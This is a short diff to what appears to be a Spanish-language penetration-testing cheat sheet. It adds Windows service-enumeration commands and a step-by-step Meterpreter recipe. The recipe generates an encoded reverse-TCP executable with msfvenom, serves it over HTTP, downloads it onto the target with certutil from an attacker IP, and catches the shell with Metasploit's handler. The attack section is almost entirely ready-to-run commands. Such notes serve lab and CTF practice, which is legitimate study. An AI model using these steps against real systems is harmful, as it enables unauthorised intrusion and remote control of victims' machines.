@@ -847,6 +847,8 @@ ________________________________________________________________________________
 	set   ---   
 	netstat   ---   
 	reg /query   ---   
+	sc queryex   ---   enumera los servicios
+	sc queryex | find /i "SERVICE_NAME:"   ---   enumera los servicios
 	sc query windefend   ---   
 	sc queryex type=service   ---   	
 	netsh advfirewall firewall dump   ---   dumpear si tiene firewall o antivirus
@@ -1072,6 +1074,22 @@ ________________________________________________________________________________
 	/usr/bin/script -qc /bin/bash /dev/null
 
 # Windows
+# Meterpreter # Primero crear el payload con msfvenom
+	msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -e x64/shikata_ga_nai -f exe -o shell.exe
+# Traferir esta shell con un servidor http
+	python3 -m http.server 8080   ---   kali
+	certutil -urlcache -f http://10.2.28.216:8080/shell.exe shell.exe   ---   target
+# Iniciar metasploit
+	use exploit/multi/handler
+	set payload windows/meterpreter/reverse_tcp
+	show options
+	run
+# Activar el payload en target y listo
+	
+	
+
+
+
 	https://github.com/antonioCoco/ConPtyShell
 
 
